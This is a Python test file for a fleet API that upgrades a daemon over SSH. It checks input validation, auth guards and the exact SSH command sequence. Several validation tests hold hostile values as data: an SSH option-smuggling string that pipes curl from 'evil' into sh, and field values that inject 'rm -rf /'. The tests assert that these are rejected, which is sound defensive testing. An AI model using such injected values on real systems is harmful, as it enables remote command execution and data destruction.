"""Per-host daemon upgrade: /api/fleet/hosts/{name}/upgrade + the ssh runner.

The runner is exercised through an injected ``run`` recorder — the exact argv
sequence IS the contract (option-smuggling and the bin/pip-shebang trap are both
argv-shaped bugs), so the tests assert it literally.
"""
from __future__ import annotations

import asyncio
import subprocess

import pytest
from fastapi import FastAPI, HTTPException
from fastapi.testclient import TestClient

from server.api.fleet import (
    HostCreate, HostPatch, create_host, list_hosts, router, sanitize_patch,
    update_host, upgrade_host, UpgradeBody,
)
from server.sessions import host_upgrade


class _FakeIdentity:
    pass


@pytest.fixture(autouse=True)
def _fresh_upgrade_state():
    host_upgrade._reset_state_for_tests()
    yield
    host_upgrade._reset_state_for_tests()


# ---------------------------------------------------------------- validation

def test_patch_accepts_ssh_config():
    out = sanitize_patch({"sshHost": "deploy@rocky", "repoPath": "/srv/ccswitch"})
    assert out == {"ssh_host": "deploy@rocky", "repo_path": "/srv/ccswitch"}


def test_patch_empty_string_clears_ssh_config():
    """'' -> NULL: the operator can un-configure a host (None means untouched)."""
    out = sanitize_patch({"sshHost": "", "repoPath": ""})
    assert out == {"ssh_host": None, "repo_path": None}
    assert sanitize_patch({"sshHost": None, "repoPath": None}) == {}


def test_patch_rejects_option_smuggling_ssh_host():
    """ssh treats a leading '-' as an OPTION; '-oProxyCommand=…' would execute
    an attacker command with the deploy user's sudo. Must 400, never store."""
    with pytest.raises(HTTPException) as exc:
        sanitize_patch({"sshHost": "-oProxyCommand=curl evil|sh"})
    assert exc.value.status_code == 400
    assert exc.value.detail["code"] == "invalid_ssh_host"


@pytest.mark.parametrize("bad", ["rocky; rm -rf /", "roc ky", "@rocky", "user@-rocky"])
def test_patch_rejects_unsafe_ssh_hosts(bad):
    with pytest.raises(HTTPException):
        sanitize_patch({"sshHost": bad})


@pytest.mark.parametrize("bad", [
    "relative/path", "-", "/path;rm -rf /", "/path with space", "/p'q", "~/repo",
])
def test_patch_rejects_unsafe_repo_paths(bad):
    with pytest.raises(HTTPException) as exc:
        sanitize_patch({"repoPath": bad})
    assert exc.value.status_code == 400
    assert exc.value.detail["code"] == "invalid_repo_path"


# ---------------------------------------------------------------- auth

def test_upgrade_requires_auth():
    app = FastAPI()
    app.include_router(router)  # no dependency override -> real auth
    r = TestClient(app).post("/api/fleet/hosts/rocky/upgrade", json={})
    assert r.status_code in (401, 403)


# ---------------------------------------------------------------- guards

async def _mk_host(name="rocky", *, ssh=True, enabled=True, active=0):
    await create_host(HostCreate(name=name, endpoint="https://rocky:9443"),
                      _identity=_FakeIdentity())
    if ssh:
        await update_host(name, HostPatch(sshHost="deploy@rocky",
                                          repoPath="/srv/ccswitch"),
                          _identity=_FakeIdentity())
    from sqlalchemy import update as sa_update
    from server.db import db_session
    from server.db.models import Host
    async with db_session() as db:
        await db.execute(sa_update(Host).where(Host.name == name)
                         .values(enabled=enabled, active_sessions=active))


def _init(tmp_path, name):
    from server.db import init_db
    return init_db(db_url=f"sqlite+aiosqlite:///{tmp_path / name}")


def test_upgrade_404_unknown_host(tmp_path):
    async def run():
        await _init(tmp_path, "u404.db")
        await upgrade_host("ghost", None, _identity=_FakeIdentity())
    with pytest.raises(HTTPException) as exc:
        asyncio.run(run())
    assert exc.value.status_code == 404


def test_upgrade_409_when_not_configured(tmp_path):
    async def run():
        await _init(tmp_path, "ucfg.db")
        await _mk_host(ssh=False)
        await upgrade_host("rocky", None, _identity=_FakeIdentity())
    with pytest.raises(HTTPException) as exc:
        asyncio.run(run())
    assert exc.value.status_code == 409
    assert exc.value.detail["code"] == "upgrade_not_configured"


def test_upgrade_409_when_disabled(tmp_path):
    async def run():
        await _init(tmp_path, "udis.db")
        await _mk_host(enabled=False)
        await upgrade_host("rocky", None, _identity=_FakeIdentity())
    with pytest.raises(HTTPException) as exc:
        asyncio.run(run())
    assert exc.value.status_code == 409
    assert exc.value.detail["code"] == "host_disabled"


def test_upgrade_409_with_active_sessions(tmp_path):
    async def run():
        await _init(tmp_path, "uact.db")
        await _mk_host(active=2)
        await upgrade_host("rocky", None, _identity=_FakeIdentity())
    with pytest.raises(HTTPException) as exc:
        asyncio.run(run())
    assert exc.value.status_code == 409
    assert exc.value.detail["code"] == "sessions_active"


def test_upgrade_force_bypasses_active_sessions(tmp_path, monkeypatch):
    async def fake_run_upgrade(name, **kw):
        host_upgrade._STATE[name].update(state="done", step=None)
        return host_upgrade._STATE[name]

    async def run():
        await _init(tmp_path, "uforce.db")
        await _mk_host(active=2)
        monkeypatch.setattr(host_upgrade, "run_upgrade", fake_run_upgrade)
        res = await upgrade_host("rocky", UpgradeBody(force=True),
                                 _identity=_FakeIdentity())
        await host_upgrade._STATE["rocky"]["_task"]
        return res

    assert asyncio.run(run()) == {"started": True, "host": "rocky"}


def test_upgrade_409_when_already_running(tmp_path, monkeypatch):
    release = None

    async def fake_run_upgrade(name, **kw):
        await release.wait()

    async def run():
        nonlocal release
        release = asyncio.Event()
        await _init(tmp_path, "urun.db")
        await _mk_host()
        monkeypatch.setattr(host_upgrade, "run_upgrade", fake_run_upgrade)
        await upgrade_host("rocky", None, _identity=_FakeIdentity())
        try:
            await upgrade_host("rocky", None, _identity=_FakeIdentity())
            raise AssertionError("expected 409")
        except HTTPException as exc:
            assert exc.status_code == 409
            assert exc.detail["code"] == "upgrade_running"
        finally:
            release.set()
            await host_upgrade._STATE["rocky"]["_task"]

    asyncio.run(run())


# ---------------------------------------------------------------- runner

_SSH_PREFIX = ["ssh", "-oBatchMode=yes", "-oConnectTimeout=10", "deploy@rocky"]


def _recorder(calls, fail_on: str | None = None):
    def run(argv, **kw):
        calls.append(argv)
        rc = 1 if (fail_on and fail_on in argv) else 0
        return subprocess.CompletedProcess(argv, rc, stdout="", stderr="boom")
    return run


class _Client:
    async def call(self, method, **kw):
        return {"state": "ready"} if method == "drain_status" else {}
    async def aclose(self):
        pass


def _fetch(sha):
    async def f(endpoint):
        return {"sha": sha, "checkoutSha": sha}
    return f


async def _target():
    return "def5678"


def test_run_upgrade_targets_the_deployed_sha_and_runs_the_shared_sequence():
    """The Fleet UI button is the SAME RunnerDeploy the deploy fan-out uses: an explicit
    target sha (the deployed one, never a bare origin/master), ff-only, sync before restart."""
    calls: list[list[str]] = []

    async def run():
        return await host_upgrade.run_upgrade(
            "rocky", ssh_host="deploy@rocky", repo_path="/srv/ccswitch",
            endpoint="https://rocky:9443", run=_recorder(calls), fetch_info=_fetch("def5678"),
            resolve_target=_target, client_factory=lambda e: _Client(), verify_interval_s=0)

    st = asyncio.run(run())
    assert st["state"] == "done" and st["error"] is None and st["target"] == "def5678"
    assert calls == [
        _SSH_PREFIX + ["git", "-C", "/srv/ccswitch", "fetch", "--quiet", "origin"],
        _SSH_PREFIX + ["git", "-C", "/srv/ccswitch", "merge", "--ff-only", "def5678"],
        _SSH_PREFIX + ["/srv/ccswitch/.venv/bin/python", "-m", "pip", "install", "-e",
                       "'/srv/ccswitch[server]'", "--quiet"],
        _SSH_PREFIX + ["sync"],
        _SSH_PREFIX + ["sudo", "-n", "systemctl", "restart", "ccswitch-daemon.service"],
    ]
    assert not any("bin/pip" in arg for call in calls for arg in call)


def test_run_upgrade_failure_records_step_and_error():
    calls: list[list[str]] = []

    async def run():
        return await host_upgrade.run_upgrade(
            "rocky", ssh_host="deploy@rocky", repo_path="/srv/ccswitch",
            endpoint="https://rocky:9443", run=_recorder(calls, fail_on="--ff-only"),
            fetch_info=_fetch("def5678"), resolve_target=_target,
            client_factory=lambda e: _Client())

    st = asyncio.run(run())
    assert st["state"] == "failed" and st["step"] == "merge"
    assert "merge failed" in st["error"] and "boom" in st["error"]
    assert len(calls) == 2


def test_run_upgrade_fails_when_sha_never_matches():
    async def run():
        return await host_upgrade.run_upgrade(
            "rocky", ssh_host="deploy@rocky", repo_path="/srv/ccswitch",
            endpoint="https://rocky:9443", run=_recorder([]), fetch_info=_fetch("abc0000"),
            resolve_target=_target, client_factory=lambda e: _Client(),
            verify_timeout_s=0.05, verify_interval_s=0.01)

    st = asyncio.run(run())
    assert st["state"] == "failed" and st["step"] == "verify"


def test_default_target_prefers_deploy_state(tmp_path):
    from server.db import init_db
    from server.deploy.state import record_deploy

    async def run():
        await init_db(db_url=f"sqlite+aiosqlite:///{tmp_path / 't.db'}")
        await record_deploy(sha="c" * 40, short="ccccccc", daemon_changed=True)
        return await host_upgrade.default_target_sha(resolve_origin=lambda: "zzzzzzz")

    # The FULL sha, not deployed_short: a short sha is only minimal-unique on the edge
    # that abbreviated it and can be ambiguous on the runner it's merged into.
    assert asyncio.run(run()) == "c" * 40


def test_default_target_falls_back_to_origin_master_without_deploy_state(tmp_path):
    from server.db import init_db

    # The fallback resolves origin/master with `rev-parse` (not `--short`) for the same
    # reason as the deploy_state branch: the sha lands in `git merge --ff-only` on ANOTHER
    # host, which may need more hex digits to disambiguate the same commit.
    full = "e" * 40

    async def run():
        await init_db(db_url=f"sqlite+aiosqlite:///{tmp_path / 'u.db'}")
        return await host_upgrade.default_target_sha(resolve_origin=lambda: full)

    got = asyncio.run(run())
    assert got == full and len(got) == 40


# ------------------------------------------------- state via list endpoint

def test_upgrade_state_visible_via_list_hosts(tmp_path, monkeypatch):
    """The UI polls GET /hosts, so the in-process upgrade state must ride along
    on the wire shape — running while in flight, done after."""
    started = None
    release = None

    async def fake_run_upgrade(name, **kw):
        started.set()
        await release.wait()
        host_upgrade._STATE[name].update(state="done", step=None,
                                         target="def5678")

    async def run():
        nonlocal started, release
        started, release = asyncio.Event(), asyncio.Event()
        await _init(tmp_path, "ulist.db")
        await _mk_host()
        monkeypatch.setattr(host_upgrade, "run_upgrade", fake_run_upgrade)

        before = (await list_hosts(_identity=_FakeIdentity()))["hosts"][0]
        assert before["upgrade"]["state"] == "idle"
        assert before["sshHost"] == "deploy@rocky"
        assert before["repoPath"] == "/srv/ccswitch"

        await upgrade_host("rocky", None, _identity=_FakeIdentity())
        await started.wait()
        during = (await list_hosts(_identity=_FakeIdentity()))["hosts"][0]
        assert during["upgrade"]["state"] == "running"

        release.set()
        await host_upgrade._STATE["rocky"]["_task"]
        after = (await list_hosts(_identity=_FakeIdentity()))["hosts"][0]
        assert after["upgrade"]["state"] == "done"
        assert after["upgrade"]["target"] == "def5678"

    asyncio.run(run())
